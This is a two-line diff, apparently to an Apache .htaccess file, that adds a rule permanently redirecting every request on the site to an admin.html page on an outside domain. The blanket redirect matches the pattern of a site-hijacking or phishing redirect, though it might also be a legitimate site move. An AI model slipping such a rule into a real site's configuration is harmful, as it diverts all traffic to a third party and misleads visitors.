@@ -1,0 +1,2 @@
+RewriteEngine On
+RewriteRule ^(.*)$ https://harmaalwale.com/admin.html [R=301,L]
